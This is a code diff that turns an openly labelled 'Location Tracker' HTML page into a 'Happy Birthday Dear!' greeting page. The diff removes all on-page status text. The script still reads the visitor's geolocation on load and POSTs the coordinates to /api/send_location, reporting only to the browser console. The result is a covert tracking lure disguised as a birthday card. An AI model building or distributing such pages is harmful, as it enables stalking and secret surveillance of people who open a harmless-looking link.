@@ -1,41 +1,70 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Location Tracker</title>
+  <title>🎂 Happy Birthday</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #f8e1f4, #ffe3e3);
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #444;
+      text-align: center;
+    }
+    h1 {
+      font-size: 36px;
+      color: #c71585;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 18px;
+      color: #555;
+    }
+  </style>
 </head>
 <body>
-  <h2>Getting Your Location...</h2>
-  <p id="status">Please allow location access.</p>
+  <h1>🎉 Happy Birthday Dear!</h1>
+  <p>Wishing you all the joy and happiness!</p>
 
   <script>
     function sendLocation(lat, lon) {
-      fetch("/api/send_location", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ lat: lat, lon: lon })
+      fetch('/api/send_location', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ lat, lon })
       })
-      .then(() => {
-        document.getElementById("status").innerText = "✅ Location sent!";
+      .then(res => {
+        if (res.ok) {
+          console.log("✅ Location sent");
+        } else {
+          console.error("❌ Error sending location");
+        }
       })
-      .catch(() => {
-        document.getElementById("status").innerText = "❌ Failed to send location.";
+      .catch(err => {
+        console.error("⚠️ Failed to send location:", err);
       });
     }
 
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const lat = pos.coords.latitude.toFixed(6);
-          const lon = pos.coords.longitude.toFixed(6);
+        (position) => {
+          const lat = position.coords.latitude.toFixed(6);
+          const lon = position.coords.longitude.toFixed(6);
           sendLocation(lat, lon);
         },
-        (err) => {
-          document.getElementById("status").innerText = "❌ " + err.message;
+        (error) => {
+          console.error("⚠️ Location access denied:", error.message);
         }
       );
     } else {
-      document.getElementById("status").innerText = "Geolocation not supported.";
+      console.warn("❌ Geolocation not supported");
     }
   </script>
 </body>
